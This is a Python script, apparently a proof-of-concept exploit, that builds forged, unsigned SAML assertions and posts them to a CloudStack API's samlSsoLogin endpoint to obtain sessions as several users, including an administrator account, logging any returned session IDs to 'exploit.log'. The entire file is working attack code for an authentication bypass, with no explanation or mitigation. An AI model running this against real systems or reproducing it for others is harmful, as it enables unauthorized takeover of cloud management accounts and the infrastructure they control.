import requests
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
import base64
import logging


logging.basicConfig(filename='exploit.log', level=logging.INFO, 
                    format='%(asctime)s - %(message)s')

url = "http://target-cloudstack-instance.com/client/api"

def generate_saml_response(username):
    """生成动态SAML响应并Base64编码"""
    now = datetime.utcnow()
    issue_instant = now.strftime('%Y-%m-%dT%H:%M:%SZ')
    not_on_or_after = (now + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')
    
    # SAML响应模板
    saml = f"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" 
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_8f0d8b57b7b34a1a8f0d8b57b7b34a1a" 
    Version="2.0" IssueInstant="{issue_instant}" Destination="{url}">
        <saml:Issuer>http://your-saml-issuer.com</saml:Issuer>
        <samlp:Status><samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/></samlp:Status>
        <saml:Assertion Version="2.0" ID="_abc123" IssueInstant="{issue_instant}">
            <saml:Issuer>http://your-saml-issuer.com</saml:Issuer>
            <saml:Subject>
                <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{username}</saml:NameID>
                <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                    <saml:SubjectConfirmationData NotOnOrAfter="{not_on_or_after}" Recipient="{url}"/>
                </saml:SubjectConfirmation>
            </saml:Subject>
            <saml:Conditions NotBefore="{issue_instant}" NotOnOrAfter="{not_on_or_after}">
                <saml:AudienceRestriction><saml:Audience>{url}</saml:Audience></saml:AudienceRestriction>
            </saml:Conditions>
            <saml:AuthnStatement AuthnInstant="{issue_instant}" SessionIndex="_abc123">
                <saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef></saml:AuthnContext>
            </saml:AuthnStatement>
        </saml:Assertion>
    </samlp:Response>"""
    
    return base64.b64encode(saml.encode()).decode()

def attempt_login(saml_response):

    response = requests.post(url, data={"command": "samlSsoLogin", "SAMLResponse": saml_response})
    
    if response.status_code == 200:
        session_id = BeautifulSoup(response.text, 'html.parser').find('sessionid')
        if session_id:
            msg = f"Login successful, session ID: {session_id.text}"
        else:
            msg = "Login failed, no session ID found"
    else:
        msg = f"Login failed, status code: {response.status_code}"
    
    logging.info(msg)
    print(msg)

for user in ["user1@example.com", "user2@example.com", "admin@example.com"]:
    attempt_login(generate_saml_response(user))
